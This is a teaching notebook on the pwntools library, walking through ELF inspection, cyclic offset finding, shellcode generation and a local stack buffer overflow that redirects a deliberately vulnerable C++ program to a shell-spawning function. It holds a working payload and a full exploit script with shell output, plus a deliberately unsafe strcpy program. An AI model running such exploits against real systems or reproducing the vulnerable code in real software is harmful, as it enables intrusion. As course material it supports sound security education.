# Pwntools and Python Exploit Code

## Topics
- Pwntools Python Framework
- Pwntools Installation and Introduction
- Pwntools Usage and Demos
- Python Exploit Code
- Stack Overflow Exploit
- Core Dump to Find Offset
- Shellcode and Shellcode Injection
- Pwntools Template for Exploit Code
- Exploiting Set-UID Programs

# Python Exploit Code
- Python is a popular language among security professionals
- there are a lot of third-party libraries, frameworks and software created for security-related tasks (CTF, pen-testing, vulnerabiliy scanning, etc.) using Python
- we'll use pwntools library - [https://github.com/Gallopsled/pwntools#readme](https://github.com/Gallopsled/pwntools#readme) for generating the exploit code template and exploiting our vulnerable target program
- make sure pwntools Python library is installed

## Pwntools Python Framework

- Complete Tutoraials found here: [https://github.com/Gallopsled/pwntools-tutorial](https://github.com/Gallopsled/pwntools-tutorial)
- Documentation on Pwntools found here: [https://docs.pwntools.com/en/stable/about.html](https://docs.pwntools.com/en/stable/about.html)

- this notebook provides quick tutorials and demos on most common tasks used in basic binary exploitations

## Pwntools Introduction

- a grab-bag of tools to make exploitation during CTFs as painless as possible, and to make exploits as easy to read as possible
- makes it easy to do a local exploit, remote exploit or exploit over SSH with a one-line change
- has two main main modules: `pwn` and `pwnlib`

### pwn - Toolbox optimized for CTFs

- `import pwn` or ` from pwn import *` - you'll have access to everythin you need to write an exploit
- we'll see pwntools usage and demos specific to CTFs in [CTF](./CTF.ipynb) notebook
- install pwntools with python package manager `pip`

### Caveat
- pwntools is generated for exploiting binary programing written in C and NOT CPP
- for binary written in C++, one has to work a little harder and know underlying basics of pwntools and binary generated by C++ compiler such as g++

### Installation
- install the release version on Linux using the following instructions


```bash
%%bash
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

#### help

```bash
â”Œâ”€â”€(kaliã‰¿K)-[~/EthicalHacking]
â””â”€$ pwn -h                                                                                  2 â¨¯
usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update,version}
           ...

Pwntools Command-line Interface

positional arguments:
  {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update,version}
    asm                 Assemble shellcode into bytes
    checksec            Check binary security settings
    constgrep           Looking up constants from header files. Example: constgrep -c freebsd
                        -m ^PROT_ '3 + 4'
    cyclic              Cyclic pattern creator/finder
    debug               Debug a binary in GDB
    disasm              Disassemble bytes into text format
    disablenx           Disable NX for an ELF binary
    elfdiff             Compare two ELF files
    elfpatch            Patch an ELF file
    errno               Prints out error messages
    hex                 Hex-encodes data provided on the command line or stdin
    phd                 Pwnlib HexDump
    pwnstrip            Strip binaries for CTF usage
    scramble            Shellcode encoder
    shellcraft          Microwave shellcode -- Easy, fast and delicious
    template            Generate an exploit template
    unhex               Decodes hex-encoded data provided on the command line or via stdin.
    update              Check for pwntools updates
    version             Pwntools version

optional arguments:
  -h, --help            show this help message and exit
```


```python
! pwn update
```


```python
!pwd
```


```python
%cd ../demos
```


```python
! ls
```


```python
! pwn elfdiff ./hello.exe ./hello.exe
```


```python
! g++ -o hello.exe hello.cpp
```


```python
! gcc -o hello_c.exe hello.c
```


```python
! pwn elfdiff ./hello.exe ./hello_c.exe
```


```python
! pwn phd ./hello.exe
```

###  Using Pwntools with Python Scripts

```python
from pwn import *
```

- import all the names in global scope

- see all the names imported into global namespace to make your life easier: 
[https://docs.pwntools.com/en/stable/globals.html](https://docs.pwntools.com/en/stable/globals.html)

## Tubes
- need to talk to the target binary in order to `pwn` it!
- pwntools makes it a breeze...
- unlike other Python libraries, pwn doesn't seem to work directly on Jupyter Notebook that uses IPython
- let's use Python prompt on termial to demostrate some quick one liners for basic io
- see details: https://github.com/Gallopsled/pwntools-tutorial/blob/master/tubes.md
    

```bash

â”Œâ”€â”€(kaliã‰¿K)-[~/EthicalHacking]
â””â”€$ python                                                                                127 â¨¯
Python 3.8.5 (default, Sep  4 2020, 07:30:14) 
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> sh = process('sh')
[x] Starting local process '/usr/bin/sh'
[+] Starting local process '/usr/bin/sh': pid 16126

```


```python
from pwn import *
```


```python
sh = process('sh')
```

####  Basic IO
- `recv(n)` - Recieves any number of available bytes
- `recvline()` - Receives data until a newline is encountered
- `recvuntil(delim)` - Receives data until a delimeter is encountered
- `send(data)` - Sends data
- `sendline(data)` - Sends data plus a newline char
- `clean()` - Discard all buffered data

```bash
>>> sh.sendline(b'sleep 3; echo Hello World!;')
>>> print(sh.recvline())
b'Hello World!\n'
```


```python
sh.sendline(b'sleep 3; echo hello world')
```


```python
sh.recvline()
```


```python
sh.sendline(b'echo $((2+10))')
```


```python
print(sh.recvline().decode('utf-8'))
```

#### Interactive sessions
- let's pretend you land a shell on some remote server
- interactive mode doesn't work on Jupyter Notebook
- see script examples in `demos/pwntools/basic_io` folder

```bash
>>> sh.interactive()
[*] Switching to interactive mode

whoami  
kali
date
Fri 18 Dec 2020 12:28:44 PM MST

exit
[*] Got EOF while reading in interactive

[*] Process '/bin/sh' stopped with exit code 0 (pid 16145)
[*] Got EOF while sending in interactive
```

- compile `demos/pwntools/basic_io/io_demo.cpp` file
- manually run the file first then run the following pwn_io_demo.py script to automatically interact with the binary


```python
! pwd
```


```python
! cat pwntools/basic_io/io_demo.cpp
```


```python
! ls
```


```bash
%%bash
input="pwntools/basic_io/io_demo.cpp"
output="io_demo.exe"
echo kali | sudo -S ./compile.sh $input $output
```


```python
! cat pwntools/basic_io/pwn_io_demo.py
```


```python
! python pwntools/basic_io/pwn_io_demo.py
```

## Utility Functions
- half of Pwntools is utility functions so that you no longer need to copy paste things
- see here - https://github.com/Gallopsled/pwntools-tutorial/blob/master/utility.md

### Packing and Unpacking Integers

- integers such as memory addresses need to be sent to the target program according to it's endianness (x86 is little endian)
- pwntools can detect and automatically pack and unpack integers according to the endianness of the target program

- `pack()` - create word-size (4 bytes) packed (endian-aware) integer
    - help(pack)
- `unpack()` - unpacks a word-size integer (endian-aware)
    - help(unpack)
- `p32()` - pack an integer as 32-bit binary value
    - help(p32)
- `u32()` - unpack packed binary into integer value
    - help(u32)
- also has API to pack and unpack into 8, 16, 64-bit, and archetecture specific integer representations


```python
help(pack)
```


```python
pack(1)
```


```python
help(unpack)
```


```python
unpack(b'\x01\x00\x00\x00')
```


```python
p32(1)
```


```python
p32(2**32-1)
```


```python
p32(1, endian='big')
```


```python
p16(1)
```


```python
p64(1)
```


```python
p32(0xdeadbeef, endian='big')
```


```python
ret_add = add = p32(0xdeadbeef) # little endian
```


```python
ret_add
```


```python
print(u32(ret_add))
```


```python
hex(u32(ret_add))
```

## ELFs
- https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
- `ELF` class makes it easy to interact with ELF files

```bash
>>> from pwn import *
>>> ELF('/bin/bash')
[*] '/bin/bash'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
ELF('/bin/bash')

```

### Using Symbols

- ELF files have several sets of symbols available
- symbols are contained in respective dictionary `{name: data}`
    - ELF.symbols - lists all known symbols, including those below. Preference is given the PLT entries over GOT entries.
    - ELF.got - only contains GOT entries
        - Global Offsets Table is used to resolve addresses of global variables and functions
    - ELF.plt only contains PLT entries
        - Procedure Linkage Table is used to call external/library procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time
        - once the address of functions are resolved they're cached in GOT for faster lookup
    - ELF.functions - only contains functions (requires DWARF symbols)
- more on PLT and GOT read [this](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
- Let's compile and and read ELF of `demos/pwntools/demo.cpp` program


```python
! cat pwntools/demo.cpp
```


```bash
%%bash
input="pwntools/demo.cpp"
output="demo.exe"
echo kali | sudo -S ./compile.sh $input $output
```


```python
! nm demo.exe
```


```python
# let's find the address of get_shell using nm program
! nm demo.exe | grep get_shell
```


```python
from pwn import *
```


```python
# let's load the binary contents using ELF class
e = ELF('./demo.exe')
```


```python
# let's see all the symbols; a python dictionary
e.symbols
```


```python
e.functions
```


```python
# look at individual entry in symbols table
print(f'{e.symbols["main"]:#010x}')
```


```python
# look at individual entry in got table
print(f'{e.got["printf"]:#010x}')
```


```python
# look at individual entry in plt table
print(f'{e.plt["printf"]:#010x}')
```


```python
# look at individual entry in functions and it's address vale
print(f'{e.functions["main"].address:#010x}')
```


```python
# use get method instead of [] operator to avoid exception
get_shell = e.symbols.get('_Z9get_shellv')
```


```python
print(hex(get_shell))
```


```python
print(f'{get_shell:#010x}')
```


```python
# programmatically find the address of get_shell function
# similar to nm | grep get_shell command
for key in e.functions:
    if 'get_shell' in key:
        print(f'{key} {e.functions[key].address:#010x}')
```

### Reading ELF Files
- interact with ELF as if it were loadded into memory
- use `read`, `write`, `pack`, `unpack`, `disasm`, etc. methods to interact


```python
get_shell = e.symbols.get('_Z9get_shellv')
```


```python
print(f'{get_shell:#010x}')
```


```python
# read 14 bytes from starting of get_shell() location
e.read(get_shell, 14)
```


```python
e.address
```


```python
# print 4 bytes from the beginning of the e's address in memory
print(e.read(e.address, 4))
```


```python
# disassemble the 14 bytes from the starting of get_shell() location
print(e.disasm(get_shell, 14))
```

### Patching ELF Files
- modify/patch ELF files
- let's modify `clear` with `sh` to get a shell


```python
e = ELF('./demo.exe')
```


```python
# returns an iterator
e.search(b'clear')
```


```python
# convert the first address of the string 'clear' in the binary into hex
hex(next(e.search(b'clear')))
```


```python
# read the 5 characters from the address of the string 'clear'
e.read(0x804a04c, 5)
```


```python
# patch the binary by replacing the string 'clear' with 'sh\x00'
e.write(next(e.search(b'clear')), b'sh\x00')
```


```python
# save the patched binary
e.save('pwntools-demos/demo_mod.exe')
```


```python
! ls -al ./demo_mod.exe
```


```python
! chmod +x ./demo_mod.exe
```


```python
! ls -al ./demo_mod.exe
# run the demo_mod.exe from a terminal
```

### Generating Unique Cyclic Sequences
- inorder to find offset, we need to generate a cyclic pattern long enough to crash the target program by over-writing the caller's return address

- `cyclic(length, n)` - Generates a length of the sequence that should be `n` character unique
- `cyclic_find(subsequence, n)` - Finds subsequence that's `n` bytes unique; return positive index for -1 (if subsequence not found)

- create a cyclic pattern of size 20 with group of 8 unique characters

```bash
>>> cyclic(20, n=8)
b'aaaaaaaabaaaaaaacaaa'
```

- search 8 a's subsequence in cyclic pattern

```bash
>>> cyclic_find('aaaaaaaa', n=8)
0

```

### Core dump and offset

- see `demos/pwntools/core_files` to find offset from core dump files


```python
# generate a cyclic pattern of 10 characters with default length of 4
cyclic(10)
```


```python
# generate a cyclic pattern of 10 characters with length of 8
c = cyclic(20, n=8)
```


```python
c
```


```python
cyclic_find(c, n=8)
```


```python
# typically used in x64-bit system
cyclic_find('aaaaaaaa', n=8)
```


```python
# typically used in x32-bit system
cyclic_find('aaaa')
```


```python
cyclic_find('baaaaaaa', n=8)
```


```python
cyclic_find('baaa', n=4)
```

### Shellcode

- pwntools provide shellcraft command to generate shellcode for different platforms for many common purposes
- list available shellcode

```bash
$ shellcraft --help
$ shellcraft -l
$ shellcraft -l | grep i386.linux

```

- running a shellcode

```bash
â”Œâ”€â”€(kaliã‰¿K)-[~]
â””â”€$ shellcraft -r i386.linux.sh    
[!] Your binutils version is too old and may not work!
    Try updating with: https://docs.pwntools.com/en/stable/install/binutils.html
    Reported Version: "GNU assembler (crosstool-NG 1.23.0.444-4ea7) 2.31.1\nCopyright (C) 2018 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License version 3 or later.\nThis program has absolutely no warranty.\nThis assembler was configured for a target of `x86_64-conda_cos6-linux-gnu'."
[*] '/tmp/pwn-asm-f0hjebqe/step3-elf'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8049000)
    RWX:      Has RWX segments
[+] Starting local process '/tmp/pwn-asm-f0hjebqe/step3-elf': pid 22485
[*] Switching to interactive mode
$ whoami
kali
$ 
```

### Shellcraft in Script

- **shellcraft** API can be used in script to generate shellcode
- **asm** function can be used to assemble the shellcraft
- **make_elf** function can be used to generate standalong ELF from assemble shellcode
- elf format could be written into a binary file and execute like a regular program
- run `demos/pwntools/shellcraft/shellcraft.py` file for demo

## Exploit Code Development

- we'll use `demos/pwntools/basic_exploit/vuln.cpp` file to demonstrate the basic exploit generation with Python and pwn library


```python
!pwd
```

    /workspaces/SoftwareSecurity/notebooks



```python
%cd ../demos
```

    /workspaces/SoftwareSecurity/demos



```python
! cat pwntools/basic_exploit/vuln.cpp
```

    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    
    void get_shell() {
        system("sh");
    }
    
    void bad(char * data) {
        char buffer[64];
        strcpy(buffer, data);
        printf("%s\n", buffer);
        printf("Buffer is at %p\n", buffer);
    }
    
    int main(int argc, char** argv) {
        bad(argv[1]);
    }


- goal is to get the program execute `get_shell()` by overflowing the caller's return address in `bad()`
- draw Stack Diagram to understand the layout of the `bad()` function stack frame
- the following is the stack layout of the `bad()` function

```text
lower add   |-------------------|
0x08...     | code segment      |       
0x08...     |   get_shell       |  
0x08...     |   bad             |  
0x08...     |   main            |  
            |   ...             |  
            |   ...             |
      esp ->|-------------------| 
            | bad's stack frame |  0xffffd...
buffer[64]->| 0  | 1  | 2  | 3  |  0xffffd...
            | ....              |  0xffffd...
            | 60 | 61 | 62 | 63 |  0xffffd...
            |-------------------|
      ebp ->|   ebp of main     | 
            |-------------------|
            |ret to main 0x08...|  
            |-------------------|
            | main's stack frame| 0xffffe...
            | ...               |
higher add  |-------------------|
```

- the following is what we want the `bad()`'s stack to look like after the overflow
```text
lower add   |-------------------|
0x08...     | code segment      |       
0x08...     |   get_shell       |  
0x08...     |   bad             |  
0x08...     |   main            |  
            |   ...             |  
            |   ...             |
      esp ->|-------------------| 
            | bad's stack frame |  0xffffd...
buffer[64]->| A  | A  | A  | A  |  0xffffd...
            | ....              |  0xffffd...
            | A  | A  | A  | A  |  0xffffd...
            |-------------------|
      ebp ->|  A | A | A |  A   |
            |-------------------|
            |get_shell 0x0804...|  
            |-------------------|
            | main's stack frame| 0xffffe...
            | ...               |
higher add  |-------------------|
```

- how many A's do we need to overflow the buffer and overwrite the return address?
- find the offset to overwrite the return address with the address of `get_shell()` function
- let's see an example that uses gdb-peda and pwntools first, then we'll see an example using only pwntools


```bash
%%bash
input="pwntools/basic_exploit/vuln.cpp"
output="pwntools/basic_exploit/vuln_cpp.exe"
echo kali | sudo -S ./compile.sh $input $output
```

    /proc/sys/kernel/randomize_va_space
    0


    pwntools/basic_exploit/vuln.cpp: In function â€˜int main(int, char**)â€™:
    pwntools/basic_exploit/vuln.cpp:17:14: warning: unused parameter â€˜argcâ€™ [-Wunused-parameter]
       17 | int main(int argc, char** argv) {
          |          ~~~~^~~~



```python
# run the target program passing "Hello World!" argument
! ./pwntools/basic_exploit/vuln_cpp.exe "Hello World!"
```

    Hello World!
    Buffer is at 0xffffb550



```python
! ./pwntools/basic_exploit/vuln_cpp.exe $(python -c 'print("Hello_World!")')
```

    Hello_World!
    Buffer is at 0xffffb550



```python
# if you see Buffer is at different location, then disable ASLR
! echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

    0



```python
# find offset using gdb-peda
! gdb -q --batch --command=./pwntools/basic_exploit/find_offset.batch --args \
./pwntools/basic_exploit/vuln_cpp.exe
```

    [mSet 1 arguments to program[0m
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
    Buffer is at 0xffffb400
    
    Program received signal SIGSEGV, Segmentation fault.
    [2J[H[;34m[----------------------------------registers-----------------------------------][0m
    [m[;32mEAX[0m: 0x18 
    [;32mEBX[0m: 0x41413341 ('A3AA')
    [;32mECX[0m: 0x0 
    [;32mEDX[0m: [;32m0x804a01b[0m --> 0x31b0100 
    [;32mESI[0m: [;34m0xf7fb9000[0m --> 0x1e8d6c 
    [;32mEDI[0m: [;34m0xf7fb9000[0m --> 0x1e8d6c 
    [;32mEBP[0m: 0x65414149 ('IAAe')
    [;32mESP[0m: [;34m0xffffb450[0m ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    [;32mEIP[0m: 0x41344141 ('AA4A')[0m
    [m[;32mEFLAGS[0m: 0x10286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
    [m[;34m[-------------------------------------code-------------------------------------][0m[0m
    [;31mInvalid $PC address: 0x41344141[0m
    [m[;34m[------------------------------------stack-------------------------------------][0m[0m
    [m0000| [;34m0xffffb450[0m ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0004| [;34m0xffffb454[0m ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0008| [;34m0xffffb458[0m ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0012| [;34m0xffffb45c[0m ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0016| [;34m0xffffb460[0m ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0020| [;34m0xffffb464[0m ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0024| [;34m0xffffb468[0m ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [m0028| [;34m0xffffb46c[0m ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")[0m
    [;34m[------------------------------------------------------------------------------][0m
    [mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
    [mStopped reason: [;31mSIGSEGV[0m[0m
    0x41344141 in ?? ()
    [;31mRegisters contain pattern buffer:[0m
    [mEBX+0 found at offset: 68[0m
    [mEBP+0 found at offset: 72[0m
    [mEIP+0 found at offset: 76[0m
    [;33mRegisters point to pattern buffer:[0m
    [m[ESP] --> offset 80 - size ~120[0m
    [;32mPattern buffer found at:[0m
    [m0x0804d1b8 : offset   24 - size  176 ([heap])[0m
    [m0xffffb400 : offset    0 - size  200 ($sp + -0x50 [-20 dwords])[0m
    [m0xffffb833 : offset    0 - size  200 ($sp + 0x3e3 [248 dwords])[0m
    [m0xffffd475 : offset 31549 - size    4 ($sp + 0x2025 [2057 dwords])[0m
    [m0xffffd748 : offset 31549 - size    4 ($sp + 0x22f8 [2238 dwords])[0m
    [m0xffffd8ec : offset 31549 - size    4 ($sp + 0x249c [2343 dwords])[0m
    [m0xffffda2d : offset 31549 - size    4 ($sp + 0x25dd [2423 dwords])[0m
    [m0xffffdac3 : offset 31549 - size    4 ($sp + 0x2673 [2460 dwords])[0m
    [m0xffffdd01 : offset 31549 - size    4 ($sp + 0x28b1 [2604 dwords])[0m
    [;34mReferences to pattern buffer found at:[0m
    [m0xffffaef0 : 0xffffb400 ($sp + -0x560 [-344 dwords])[0m
    [m0xffffaf27 : 0xffffb400 ($sp + -0x529 [-331 dwords])[0m
    [m0xffffb3f4 : 0xffffb400 ($sp + -0x5c [-23 dwords])[0m
    [m0xffffb518 : 0xffffb833 ($sp + 0xc8 [50 dwords])[0m



```python
! gdb -q --batch --command=./pwntools/basic_exploit/find_offset.batch --args \
./pwntools/basic_exploit/vuln_cpp.exe | grep EIP+0
```

    [mEIP+0 found at offset: 76[0m



```python
# find add the address of get_shell function
! nm pwntools/basic_exploit/vuln_cpp.exe | grep get_shell
```

    080491f6 T _Z9get_shellv



```python
# append the address of get_shell function to the payload after 76As in reverse order
# must write in bytes format to pass as argument
# run the command from the Terminal to get the interactive shell
! ./pwntools/basic_exploit/vuln_cpp.exe $(python -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf6\x91\x04\x08")')
```

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½
    Buffer is at 0xffffb510
    [m[m[m[J$ [K[?2004h                                                                         [?2004l
    [m[m[m[J$ [K[?2004h[?2004l                                                                 
    [m[m[m[J$ [K[?2004h                                                                         


```python
%cd ../demos
```

    /workspaces/SoftwareSecurity/demos



```python
# generate the payload and save it in a file
! python -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf6\x91\x04\x08")' > payload.bin
```


```python
# see the pretty hexdump of the payload
! pwn phd payload.bin
```

    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  â”‚AAAA[34mâ”‚[mAAAA[34mâ”‚[mAAAA[34mâ”‚[mAAAAâ”‚
    *
    00000040  41 41 41 41  41 41 41 41  41 41 41 41  [34mf6[m [34m91[m [34m04[m [34m08[m  â”‚AAAA[34mâ”‚[mAAAA[34mâ”‚[mAAAA[34mâ”‚[m[34mÂ·[m[34mÂ·[m[34mÂ·[m[34mÂ·[mâ”‚
    00000050



```python
# run the target program with the payload file
# must run from the Terminal to get the interactive shell
! ./pwntools/basic_exploit/vuln_cpp.exe $(cat payload.bin)
```

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½
    Buffer is at 0xffffb510
    [m[m[m[J$ [K[?2004h                                                                         [?2004l
    [m[m[m[J$ [K[?2004h[?2004l                                                                 
    [m[m[m[J$ [K[?2004h                                                                         


```python
# let's write the complete exploit code
# fix the FIXME lines and run the exploit script
! cat pwntools/basic_exploit/exploit_vuln.py
```

- fix the FIXME lines and run the exploit script
- run the exploit
- get the shell!

```bash
â”Œâ”€â”€(kaliã‰¿K)-[~/EthicalHacking/pwntools-demos/basic_exploit]
â””â”€$ python exploit_vuln.py 
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x82\x91\x04\x08' has length 80
[+] Starting local process './vuln_cpp.exe': pid 17369
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x82\x91\x04\x08\n'
[*] Switching to interactive mode
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer)
$ 
$ whoami
kali
$ date
Fri 18 Dec 2020 01:52:03 PM MST
$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './vuln_cpp.exe' stopped with exit code -11 (SIGSEGV) (pid 17369)
[*] Got EOF while sending in interactive
```

### Automate Everything with pwn API

- no gdb, peda, and manual steps required for generating simple exploits
- we can use core dump to automatically find the offset and the controlled return address using **pwn** library
- check and set the coredump settings to easily find the coredump files created when system crashes
- work directly on a Terminal if jupyter notebook doesn't work to run any of the commands below
- NOTE: if the vulnerable target program is `setuid` you must run the exploit code with sudo so the core dump can be accessed by the script for processing


```python
# check if the kernel can store coredump of a program crash
# if it's 0, set it to unlimited
! ulimit -c
```

    unlimited



```python
! ulimit -c unlimited
```


```python
# jupyter notebook still says 0; check it on the terminal
! ulimit -c
```

    unlimited



```python
# check the coredump location and pattern
! cat /proc/sys/kernel/core_pattern
```

    |/usr/share/apport/apport -p%p -s%s -c%c -d%d -P%P -u%u -g%g -- %E



```python
# if it' not core, set it to store the coredump as core in the working directory
! echo kali | sudo -S sysctl -w kernel.core_pattern=core
```

    kernel.core_pattern = core



```python
# check the coredump location and pattern again and make sure its core
! cat /proc/sys/kernel/core_pattern
```

    core



```python
# -a option gives you all the settings
! ulimit -a
```

    core file size          (blocks, -c) unlimited
    data seg size           (kbytes, -d) unlimited
    scheduling priority             (-e) 0
    file size               (blocks, -f) unlimited
    pending signals                 (-i) 31733
    max locked memory       (kbytes, -l) 8192
    max memory size         (kbytes, -m) unlimited
    open files                      (-n) 1048576
    pipe size            (512 bytes, -p) 8
    POSIX message queues     (bytes, -q) 819200
    real-time priority              (-r) 0
    stack size              (kbytes, -s) 8192
    cpu time               (seconds, -t) unlimited
    max user processes              (-u) unlimited
    virtual memory          (kbytes, -v) unlimited
    file locks                      (-x) unlimited



```python
# double check to make sure file name prefix of core_pattern is core
! cat /proc/sys/kernel/core_pattern
```

    core



```python
! cat pwntools/basic_exploit/exploit_vuln_cpp.py
```

    #! /usr/bin/env python
    
    # https://docs.pwntools.com/en/stable/elf/corefile.html
    
    from pwn import *
    
    target_name = './vuln_cpp.exe'
    # Set up pwntools for the correct architecture
    exe = context.binary = ELF(target_name)
    
    # print(exe.symbols)
    
    # Generate a cyclic pattern so that we can auto-find the offset
    payload = cyclic(128)
    
    # Run the process once so that it crashes
    p = process([target_name, payload])
    p.wait()  # wait for close
    
    # Get the core dump of the crashed process
    core = p.corefile
    
    # read the core dump file directly
    # core = Core('coredump_file')
    
    # Our cyclic pattern should have been used as the crashing address, make sure!
    # assert p32(core.eip) in payload
    crash_ip = core.eip
    offset = cyclic_find(crash_ip)
    # offset = cyclic_find(core.read(core.esp, 4))-4
    print(f'{offset=}')
    # search for get_shell function address
    # in C; func_address = exe.symbols.get_shell
    # in C++; parse the symbols dictionary to look for function name in key
    for symbol in exe.symbols.keys():
        if symbol.find("get_shell") >= 0:
            func_address = exe.symbols[symbol]
            break
    
    print(f'{hex(func_address)=}')
    
    payload = flat({
        offset: func_address
    }, filler='A')
    
    print(f'{payload=}')
    
    io = process([target_name, payload])
    # receive and print the payload
    print(io.recvline())
    # Send the `id` command to the shell
    io.sendline(b'id')
    # receive and print the output of the command
    print(io.recvline())
    # get interactive shell
    io.interactive()


- for the above exploit code, everything needed to exploit the prgram is automatically determined using pwntools API except for the target program name

- run the exploit and enjoy the shell

```bash
                                                                                           
@rambasnet âžœ /workspaces/â€¦/demos/pwntools/basic_exploit (main) $ python exploit_vuln_cpp.py 
[*] '/workspaces/SoftwareSecurity/demos/pwntools-demos/basic_exploit/vuln_cpp.exe'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Starting local process './vuln_cpp.exe': pid 24733
[*] Process './vuln_cpp.exe' stopped with exit code -11 (SIGSEGV) (pid 24733)
[+] Parsing corefile...: Done
[*] '/workspaces/SoftwareSecurity/demos/pwntools-demos/basic_exploit/core.24733'
    Arch:      i386-32-little
    EIP:       0x61616161
    ESP:       0xffffb0b0
    Exe:       '/workspaces/SoftwareSecurity/demos/pwntools/basic_exploit/vuln_cpp.exe' (0x8048000)
    Fault:     0x61616161
/usr/local/python/3.12.1/lib/python3.12/site-packages/pwnlib/context/__init__.py:1709: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return function(*a, **kw)
[+] Starting local process './vuln_cpp.exe': pid 24736
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd6\x91\x04\x08\n'
b'uid=1000(codespace) gid=1000(codespace) groups=1000(codespace),106(ssh),107(docker),989(pipx),990(python),991(oryx),992(golang),993(sdkman),994(rvm),995(php),996(conda),997(nvs),998(nvm),999(hugo)\n'
[*] Switching to interactive mode
$ whoami
codespace
$ ls
compile.sh    exploit_vuln.py      find_offset.batch              vuln.c
compile_c.sh  exploit_vuln_c.py    peda-session-vuln_c.exe.txt    vuln.cpp
core.24733    exploit_vuln_cpp.py  peda-session-vuln_cpp.exe.txt  vuln_cpp.exe
$ date
Fri Mar  7 21:53:13 UTC 2025
$ exit
```

## Create Template Exploit code

- we can create an exploit code template using **pwn** and update it as necessary
- let's create the template for local exploit (default!)
- use shellcraft and/or hardcoded shellcode to exploit the vulnerable program

```bash
pwn template exe_binary_file > template_file.py
```

